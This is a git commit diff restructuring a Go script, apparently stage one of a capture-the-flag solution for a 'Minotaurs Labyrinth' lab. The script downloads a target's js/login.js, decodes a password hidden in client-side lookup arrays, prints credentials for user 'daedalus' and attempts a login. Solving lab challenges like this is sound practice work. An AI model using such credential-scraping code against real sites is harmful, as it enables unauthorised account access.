ea5cf963f17d97ee8bc95f8aea05e8d032cdbe8f
Thomas Osgood <thomasosgood@redacted.local>
2022-11-05 19:50:40 -0400

    Restructured stage1.go. Made it neater and more modular

--- Minotaurs_Labyrinth/stage1.go
+++ Minotaurs_Labyrinth/stage1.go
@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"regexp"
 	"strconv"
@@ -25,6 +26,12 @@ type AScruct struct {
 	Choices []string
 }
 
+type Client struct {
+	baseURL string
+	Route   string
+	Session *http.Client
+}
+
 func cleanLetter(letter string) (cleaned_letter string) {
 	cleaned_letter = strings.TrimSpace(letter)
 	cleaned_letter = strings.TrimLeft(cleaned_letter, "[")
@@ -34,87 +41,36 @@ func cleanLetter(letter string) (cleaned_letter string) {
 	return cleaned_letter
 }
 
-func pullScript(fullURL string, saveTgt string) (success bool, message string) {
-	var client http.Client
-
-	SysMsgNB("Pulling down script.")
-
-	client = http.Client{Timeout: 10 * time.Second}
-	req, err := http.NewRequest("GET", fullURL, nil)
+func getContent(filename string) (content []byte, success bool, message string) {
+	rptr, err := os.Open(filename)
 	if err != nil {
-		return false, err.Error()
-	}
-
-	// pull down JS code
-	resp, err := client.Do(req)
-	if err != nil {
-		return false, err.Error()
-	}
-	defer resp.Body.Close()
-
-	wptr, err := os.Create(saveTgt)
-	if err != nil {
-		return false, err.Error()
-	}
-	defer wptr.Close()
-
-	resp.Write(wptr)
-
-	SucMsg(fmt.Sprintf("Script saved to \"%s\".", saveTgt))
-
-	return true, "script pulled down successfully."
-}
-
-func GrabJSLogin(baseURL string) (password string, success bool, message string) {
-	const targetRoute string = "js/login.js"
-	const saveTgt string = "script.js"
-
-	var choices_str string
-	var fullURL string
-	var arr_pattern string
-	var pass_pattern string
-	var arrays_dict []AScruct
-
-	// build fullURL to contact
-	if string(baseURL[len(baseURL)-1]) != "/" {
-		baseURL = fmt.Sprintf("%s/", baseURL)
-	}
-	fullURL = fmt.Sprintf("%s%s", baseURL, targetRoute)
-
-	SysMsgNB(fmt.Sprintf("Full URL: %s", fullURL))
-
-	// Pull down JS script from target
-	success, message = pullScript(fullURL, saveTgt)
-	if !success {
-		return "", false, message
-	}
-
-	// Regex target patterns
-	arr_pattern = `[a-zA-Z] = \[.*\]`
-	pass_pattern = `([a-zA-Z]\[[0-9]+\]\+)+[a-zA-Z]\[[0-9]+\]`
-
-	// Setup lookup array regex
-	re_arr, err := regexp.Compile(arr_pattern)
-	if err != nil {
-		return "", false, err.Error()
-	}
-
-	// Setup password code regex
-	re_pass, err := regexp.Compile(pass_pattern)
-	if err != nil {
-		return "", false, err.Error()
-	}
-
-	rptr, err := os.Open(saveTgt)
-	if err != nil {
-		return "", false, err.Error()
+		return nil, false, err.Error()
 	}
 	defer rptr.Close()
 
 	// Read JS script content
-	content, err := ioutil.ReadAll(rptr)
+	content, err = ioutil.ReadAll(rptr)
 	if err != nil {
-		return "", false, err.Error()
+		return nil, false, err.Error()
+	}
+
+	return content, true, "content successfully pulled"
+}
+
+func pullArrays(loginScript string, arrayDict *[]AScruct) (success bool, message string) {
+	var choices_str string
+
+	arr_pattern := `[a-zA-Z] = \[.*\]`
+
+	// Setup lookup array regex
+	re_arr, err := regexp.Compile(arr_pattern)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	content, success, message := getContent(loginScript)
+	if !success {
+		return false, message
 	}
 
 	// Create slice of lookup arrays
@@ -126,31 +82,106 @@ func GrabJSLogin(baseURL string) (password string, success bool, message string)
 		for i := range choices_arr {
 			choices_arr[i] = cleanLetter(choices_arr[i])
 		}
-		arrays_dict = append(arrays_dict, AScruct{Letter: strings.TrimSpace(split_val[0]), Choices: choices_arr})
+		*arrayDict = append(*arrayDict, AScruct{Letter: strings.TrimSpace(split_val[0]), Choices: choices_arr})
+	}
+
+	return true, "arrays successfully pulled out of script"
+}
+
+func pullPassword(loginScript string) (password string, success bool, message string) {
+	pass_pattern := `([a-zA-Z]\[[0-9]+\]\+)+[a-zA-Z]\[[0-9]+\]`
+
+	// Setup password code regex
+	re_pass, err := regexp.Compile(pass_pattern)
+	if err != nil {
+		return "", false, err.Error()
+	}
+
+	content, success, message := getContent(loginScript)
+	if !success {
+		return "", false, message
 	}
 
 	// Find JS code that builds out the password
 	password_formula := re_pass.FindAll(content, -1)
-	password_formula_split := strings.Split(string(password_formula[0]), "+")
+
+	return string(password_formula[0]), true, "encoded password successfully pulled out of script"
+}
+
+func DecodePassword(loginScript string) (password string, success bool, message string) {
+	var astructSlice []AScruct
+
+	success, message = pullArrays(loginScript, &astructSlice)
+	if !success {
+		return "", false, message
+	}
+
+	passwordEnc, success, message := pullPassword(loginScript)
+	if !success {
+		return "", false, message
+	}
+	passwordEncSplit := strings.Split(passwordEnc, "+")
 
 	// loop to build the password
-	for _, cur_pass_letter := range password_formula_split {
+	for _, cur_pass_letter := range passwordEncSplit {
 		// break a[#] into a #.
 		split_result := strings.Split(cur_pass_letter, "[")
 		split_result_letter := split_result[0]
 		split_result_number, _ := strconv.Atoi(strings.Split(split_result[1], "]")[0])
 
 		// search for correct array and extract password letter from array.
-		for i := range arrays_dict {
-			if strings.Compare(arrays_dict[i].Letter, split_result_letter) == 0 {
-				password = fmt.Sprintf("%s%s", password, arrays_dict[i].Choices[split_result_number])
+		for i := range astructSlice {
+			if strings.Compare(astructSlice[i].Letter, split_result_letter) == 0 {
+				password = fmt.Sprintf("%s%s", password, astructSlice[i].Choices[split_result_number])
 				break
 			}
 		}
 	}
 
-	SysMsgNB("Password successfully extracted.")
-	return password, true, "password successfully extracted."
+	return password, true, "password successfully decoded"
+}
+
+func SaveFile(outfile string, content []byte) (success bool) {
+	SysMsgNB(fmt.Sprintf("saving content to \"%s\"", outfile))
+	fptr, err := os.Create(outfile)
+	if err != nil {
+		return false
+	}
+	defer fptr.Close()
+
+	_, err = fptr.Write(content)
+	if err != nil {
+		return false
+	}
+
+	return true
+}
+
+func (c *Client) GetScript(outfile string) (success bool, message string) {
+	SysMsgNB("creating request object")
+	req, err := http.NewRequest("GET", fmt.Sprintf("%s/js/login.js", c.baseURL), nil)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	SysMsgNB("sending request to target")
+	resp, err := c.Session.Do(req)
+	if err != nil {
+		return false, err.Error()
+	}
+	defer resp.Body.Close()
+
+	content, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return false, err.Error()
+	}
+
+	success = SaveFile(outfile, content)
+	if !success {
+		return false, fmt.Sprintf("unable to save content to \"%s\"", outfile)
+	}
+
+	return true, "login script successfully pulled down"
 }
 
 func SucMsg(msg string) {
@@ -184,20 +215,36 @@ func SysMsgNB(msg string) {
 }
 
 func main() {
+	var targetPort int
 	var targetIP string
 	var baseURL string
 
 	flag.StringVar(&targetIP, "i", "127.0.0.1", "target IP address")
+	flag.IntVar(&targetPort, "p", 80, "target port")
+
 	flag.Parse()
 
-	baseURL = fmt.Sprintf("http://%s/", targetIP)
+	baseURL = fmt.Sprintf("http://%s:%d", targetIP, targetPort)
+	InfMsg(fmt.Sprintf("Base URL: %s", baseURL))
 
-	password, success, message := GrabJSLogin(baseURL)
+	c := Client{baseURL: baseURL, Session: &http.Client{Timeout: 30 * time.Second}}
+	c.Route = "js/login.js"
+
+	success, message := c.GetScript("login.js")
 	if !success {
 		ErrMsg(message)
 		os.Exit(1)
 	}
-	SucMsg(fmt.Sprintf("Credentials Extracted: \"daedalus:%s\"", password))
+	SucMsg(message)
+
+	password, success, message := DecodePassword("login.js")
+	if !success {
+		ErrMsg(message)
+		os.Exit(1)
+	}
+	SucMsg(fmt.Sprintf("Login Credentials: \"daedalus:%s\"", password))
+
+	c.Login("daedalus", password)
 	return
 }
 
